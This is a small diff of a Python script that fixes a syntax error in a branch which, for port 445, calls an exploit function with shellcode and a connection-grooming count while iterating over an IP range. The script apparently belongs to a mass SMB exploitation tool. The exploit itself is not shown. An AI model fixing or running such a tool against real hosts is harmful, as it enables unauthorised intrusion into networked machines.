@@ -1355,7 +1355,7 @@ for i in ip_range:
 				elif port == 135:
 					print "[*] DCOMRPC - not working.. yet"	
 
-				elif port == 445
+				elif port == 445:
 					numGroomConn = 13
 					exploit(current_target, sc, numGroomConn)
 				else:
